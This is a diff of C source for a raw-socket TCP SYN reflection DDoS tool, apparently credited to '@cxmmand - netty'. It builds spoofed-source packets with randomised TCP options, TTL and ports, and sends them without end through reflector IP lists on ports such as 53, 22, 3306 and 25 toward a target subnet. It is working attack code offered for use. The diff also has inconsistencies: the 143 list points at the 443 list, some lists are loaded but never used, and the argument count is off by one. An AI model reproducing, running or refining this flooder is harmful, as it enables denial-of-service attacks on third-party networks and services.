@@ -35,7 +35,6 @@ struct list
 	struct list *prev;
 };
 typedef struct list list_t;
-typedef struct list bpg_list;
 struct tcpOptions
 {
 	uint8_t msskind;
@@ -49,19 +48,6 @@ struct tcpOptions
 	uint8_t nop_nouse3;
 	uint8_t sackkind;
 	uint8_t sacklen;
-	/*
-	uint8_t tstamp;
-	uint8_t tslen;
-	uint8_t tsno;
-	uint8_t tsclockval;
-	uint8_t tssendval;
-	uint8_t tsval;
-	uint8_t tsclock;
-	uint8_t tsecho;
-	uint8_t tsecho2;
-	uint8_t tsecho3;
-	uint8_t tsecho4;
-	*/
 };
 
 struct list *head;
@@ -75,9 +61,17 @@ struct thread_data
 	struct list *list_80;
 	struct list *list_443;
 	struct list *list_8080;
-	struct list *list_7547;
-	struct list *list_8443;
-	struct list *bpg_list_node;
+	struct list *list_53;
+	struct list *list_22;
+	struct list *list_3306;
+	struct list *list_21;
+	struct list *list_25;
+	struct list *list_110;
+	struct list *list_143;
+	struct list *list_995;
+	struct list *list_993;
+	struct list *list_465;
+	struct list *list_587;
 };
 
 void init_rand(unsigned long int x)
@@ -188,12 +182,12 @@ void setup_ip_header(struct iphdr *iph)
 	iph->saddr = inet_addr("0.0.0.0");
 }
 
-int sPorts[5] = {80, 443, 8080, 7547, 8443};
+int ports[15] = {0, 22, 80, 443, 53, 8080, 3306, 21, 25, 110, 143, 995, 993, 465, 587};
 int windows[4] = {8192, 65535, 14600, 64240};
 
 void setup_tcp_header(struct tcphdr *tcph)
 {
-	tcph->dest = htons(sPorts[randnum(0, 4)]);
+	tcph->dest = htons(80);
 	tcph->source = htons(floodport);
 	tcph->ack = 0;
 	tcph->ack_seq = randnum(10000, 99999);
@@ -237,19 +231,6 @@ void setup_tcpopts_header(struct tcpOptions *opts)
 	opts->wsshiftcount = 0x07;
 	opts->sackkind = 0x04;
 	opts->sacklen = 0x02;
-	/*
-	opts->tstamp = 0x08;
-	opts->tslen = 0x0a;
-	opts->tsno = randnum(1, 250);
-	opts->tsclockval = 0x68;
-	opts->tssendval = 0xa3;
-	opts->tsval = 0xd8;
-	opts->tsclock = 0xd9;
-	opts->tsecho = 0x00;
-	opts ->tsecho2 = 0x00;
-	opts->tsecho3 = 0x00;
-	opts->tsecho4 = 0x00;
-	*/
 }
 
 void *flood(void *par1)
@@ -264,9 +245,17 @@ void *flood(void *par1)
 	struct list *list_80 = td->list_80;
 	struct list *list_443 = td->list_443;
 	struct list *list_8080 = td->list_8080;
-	struct list *list_7547 = td->list_7547;
-	struct list *list_8443 = td->list_8443;
-	struct list *bpg_list_node = td->bpg_list_node;
+	struct list *list_53 = td->list_53;
+	struct list *list_22 = td->list_22;
+	struct list *list_3306 = td->list_3306;
+	struct list *list_21 = td->list_21;
+	struct list *list_25 = td->list_25;
+	struct list *list_110 = td->list_110;
+	struct list *list_143 = td->list_443;
+	struct list *list_995 = td->list_995;
+	struct list *list_993 = td->list_993;
+	struct list *list_465 = td->list_465;
+	struct list *list_587 = td->list_587;
 
 	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 
@@ -283,6 +272,7 @@ void *flood(void *par1)
 	iph->saddr = sins[0].sin_addr.s_addr;
 	iph->daddr = list_80->data.sin_addr.s_addr;
 	iph->check = csum((unsigned short *)datagram, iph->tot_len);
+	tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
 
 	int tmp = 1;
 	const int *val = &tmp;
@@ -297,124 +287,139 @@ void *flood(void *par1)
 	register unsigned int i;
 	i = 0;
 	int sn_i = 0;
+	int sizeof_ports = sizeof(ports) / sizeof(ports[0]) - 1;
 	while (1)
 	{
+		ports[0] = randnum(1, 1024);
 		tcph->check = 0;
-		iph->check = 0;
-		int bpgOrDrd = randnum(0, 1);
-		iph->saddr = sins[sn_i].sin_addr.s_addr;
+		opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
+		setup_tcpopts_header(opts);
+		tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
+		tcph->dest = htons(ports[randnum(0, sizeof_ports)]);
+		iph->id = htonl(rand_cmwc() & 0xFFFF);
+		tcph->ack_seq = randnum(10000, 99999);
 		iph->ttl = randnum(64, 255);
 		tcph->window = htons(windows[rand_cmwc() % 4]);
-		iph->id = htonl(rand_cmwc() & 0xFFFF);
-		if (bpgOrDrd == 1)
+		int congestion = randnum(0, 2);
+		if (congestion == 0)
 		{
-			if (floodport == 0)
-			{
-				tcph->source = htons(randnum(49152, 65535));
-			}
-			else
-			{
-				if (randnum(0, 1) == 1)
-				{
-					tcph->source = htons(179);
-				}
-				else
-				{
-					tcph->source = htons(floodport);
-				}
-			}
-			tcph->res2 = 0;
-			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
-			tcph->dest = htons(179);
-			bpg_list_node = bpg_list_node->next;
-			iph->daddr = bpg_list_node->data.sin_addr.s_addr;
-			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
-			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
-			iph->check = csum((unsigned short *)datagram, iph->tot_len);
-			sendto(s, datagram, iph->tot_len, 0,
-				   (struct sockaddr *)&bpg_list_node->data, sizeof(bpg_list_node->data));
-			continue;
+			tcph->res2 = 3; /*We support AND acknowledge Congestion*/
+		}
+		else if (congestion == 1)
+		{
+			tcph->res2 = 2; /* We support but do not acknowledge */
 		}
 		else
 		{
-			int drdossType = sPorts[randnum(0, 4)];
-
-			if (floodport == 0)
-			{
-				if (randnum(0, 1) == 1)
-				{
-					tcph->dest = htons(sPorts[randnum(0, 4)]);
-					tcph->source = htons(randnum(1024, 65535));
-				}
-				else
-				{
-					tcph->dest = htons(sPorts[randnum(0, 4)]);
-					tcph->source = htons(randnum(1, 65535));
-				}
-			}
-			else
-			{
-				tcph->source = htons(floodport);
-				tcph->dest = htons(sPorts[randnum(0, 4)]);
-			}
-			opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
-			setup_tcpopts_header(opts);
-			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
-
-			if (drdossType == 80)
-			{
-				list_80 = list_80->next;
-				iph->daddr = list_80->data.sin_addr.s_addr;
-				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
-				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
-				iph->check = csum((unsigned short *)datagram, iph->tot_len);
-				tcph->ack_seq = randnum(10000, 99999);
-				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_80->data, sizeof(list_80->data));
-			}
-			else if (drdossType == 443)
-			{
-				list_443 = list_443->next;
-				iph->daddr = list_443->data.sin_addr.s_addr;
-				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
-				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
-				iph->check = csum((unsigned short *)datagram, iph->tot_len);
-				tcph->ack_seq = randnum(10000, 99999);
-				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_443->data, sizeof(list_443->data));
-			}
-			else if (drdossType == 8080)
-			{
-				list_8080 = list_8080->next;
-				iph->daddr = list_8080->data.sin_addr.s_addr;
-				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
-				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
-				iph->check = csum((unsigned short *)datagram, iph->tot_len);
-				tcph->ack_seq = randnum(10000, 99999);
-				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_8080->data, sizeof(list_8080->data));
-			}
-			else if (drdossType == 7547)
-			{
-				list_7547 = list_7547->next;
-				iph->daddr = list_7547->data.sin_addr.s_addr;
-				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
-				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
-				iph->check = csum((unsigned short *)datagram, iph->tot_len);
-				tcph->ack_seq = randnum(10000, 99999);
-				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_7547->data, sizeof(list_7547->data));
-			}
-			else if (drdossType == 8443)
-			{
-				list_8443 = list_8443->next;
-				iph->daddr = list_8443->data.sin_addr.s_addr;
-				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
-				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
-				iph->check = csum((unsigned short *)datagram, iph->tot_len);
-				tcph->ack_seq = randnum(10000, 99999);
-				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_8443->data, sizeof(list_8443->data));
-			}
+			tcph->res2 = 1;
+		}
+		if (floodport <= 0)
+		{
+			tcph->source = htons(ports[randnum(0, sizeof_ports)]);
+		}
+		else
+		{
+			tcph->source = htons(floodport);
 		}
 
-		// printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
-		//  printf("Dst IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->daddr));
+		uint8_t reflectionType = ports[randnum(0, sizeof_ports)];
+
+		if (reflectionType == 80)
+		{
+			list_80 = list_80->next;
+			iph->daddr = list_80->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_80->data, sizeof(list_80->data));
+		}
+		else if (reflectionType == 443)
+		{
+			list_443 = list_443->next;
+			iph->daddr = list_443->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_443->data, sizeof(list_443->data));
+		}
+		else if (reflectionType == 8080)
+		{
+			list_8080 = list_8080->next;
+			iph->daddr = list_8080->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_8080->data, sizeof(list_8080->data));
+		}
+		else if (reflectionType == 53)
+		{
+			list_53 = list_53->next;
+			iph->daddr = list_53->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_53->data, sizeof(list_53->data));
+		}
+		else if (reflectionType == 22)
+		{
+			list_22 = list_22->next;
+			iph->daddr = list_22->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_22->data, sizeof(list_22->data));
+		}
+		else if (reflectionType == 3306)
+		{
+			list_3306 = list_3306->next;
+			iph->daddr = list_3306->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_3306->data, sizeof(list_3306->data));
+		}
+		else if (reflectionType == 21)
+		{
+			list_21 = list_21->next;
+			iph->daddr = list_21->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_21->data, sizeof(list_21->data));
+		}
+		else if (reflectionType == 25)
+		{
+			list_25 = list_25->next;
+			iph->daddr = list_25->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_25->data, sizeof(list_25->data));
+		}
+		else if (reflectionType == 110)
+		{
+			list_110 = list_110->next;
+			iph->daddr = list_110->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_110->data, sizeof(list_110->data));
+		}
+		else if (reflectionType == 143)
+		{
+			list_143 = list_143->next;
+			iph->daddr = list_143->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_143->data, sizeof(list_143->data));
+		}
+		else if (reflectionType == 995)
+		{
+			list_995 = list_995->next;
+			iph->daddr = list_995->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_995->data, sizeof(list_995->data));
+		}
+		else if (reflectionType == 993)
+		{
+			list_993 = list_993->next;
+			iph->daddr = list_993->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_993->data, sizeof(list_993->data));
+		}
 
 		pps++;
 
@@ -573,10 +578,10 @@ struct list *loadList(const char *filename, size_t max_len, int *out_count)
 
 int main(int argc, char *argv[])
 {
-	if (argc < 11)
+	if (argc < 19)
 	{
-		fprintf(stdout, "DrDOSyn @cxmmand - netty\n");
-		fprintf(stdout, "Usage: %s [Target (1.1.1.1/24)] [Port] [Threads] [PPS] [Time] [List Port 80] [List Port 443] [List Port 8080] [List Port 7547] [List Port 8443] [BGP List]\n", argv[0]);
+		fprintf(stdout, "Internal Reflection via Source route OVH IPs by @cxmmand - netty\n");
+		fprintf(stdout, "Usage: %s [Target (1.1.1.1/24)] [Port] [Threads] [PPS] [Time] [List Port 80] [List Port 443] [List Port 8080] [List Port 53] [List Port 22] [List Port 3306] [List Port 21] [List Port 25] [List port 110] [List Port 143] [List Port 995] [List Port 995] \n", argv[0]);
 		exit(-1);
 	}
 	srand(time(NULL));
@@ -598,13 +603,20 @@ int main(int argc, char *argv[])
 	list_t *list_80 = loadList(argv[6], max_len, &count);
 	list_t *list_443 = loadList(argv[7], max_len, &count);
 	list_t *list_8080 = loadList(argv[8], max_len, &count);
-	list_t *list_7547 = loadList(argv[9], max_len, &count);
-	list_t *list_8443 = loadList(argv[10], max_len, &count);
-
-	bpg_list *bgpCurr = loadList(argv[11], max_len, &count);
+	list_t *list_53 = loadList(argv[9], max_len, &count);
+	list_t *list_22 = loadList(argv[10], max_len, &count);
+	list_t *list_3306 = loadList(argv[11], max_len, &count);
+	list_t *list_21 = loadList(argv[12], max_len, &count);
+	list_t *list_25 = loadList(argv[13], max_len, &count);
+	list_t *list_110 = loadList(argv[14], max_len, &count);
+	list_t *list_143 = loadList(argv[15], max_len, &count);
+	list_t *list_995 = loadList(argv[16], max_len, &count);
+	list_t *list_993 = loadList(argv[17], max_len, &count);
+	list_t *list_465 = loadList(argv[18], max_len, &count);
+	list_t *list_587 = loadList(argv[19], max_len, &count);
 
 	// Check if lists loaded successfully
-	if (!list_80 || !list_443 || !list_8080 || !list_7547 || !list_8443 || !bgpCurr)
+	if (!list_80 || !list_443 || !list_8080 || !list_53 || !list_22 || !list_3306 || !list_21 || !list_25 || !list_110 || !list_143 || !list_995 || !list_993 || !list_465 || !list_587)
 	{
 		fprintf(stderr, "Failed to load one IP list\n");
 		exit(-1);
@@ -674,9 +686,17 @@ int main(int argc, char *argv[])
 		td[i].list_80 = list_80; // All threads start at head
 		td[i].list_443 = list_443;
 		td[i].list_8080 = list_8080;
-		td[i].list_7547 = list_7547;
-		td[i].list_8443 = list_8443;
-		td[i].bpg_list_node = bgpCurr; // All threads start at head
+		td[i].list_53 = list_53;
+		td[i].list_22 = list_22;
+		td[i].list_3306 = list_3306;
+		td[i].list_21 = list_21;
+		td[i].list_25 = list_25;
+		td[i].list_110 = list_110;
+		td[i].list_143 = list_143;
+		td[i].list_995 = list_995;
+		td[i].list_993 = list_993;
+		td[i].list_465 = list_465;
+		td[i].list_587 = list_587;
 
 		if (pthread_create(&thread[i], NULL, &flood, (void *)&td[i]) != 0)
 		{
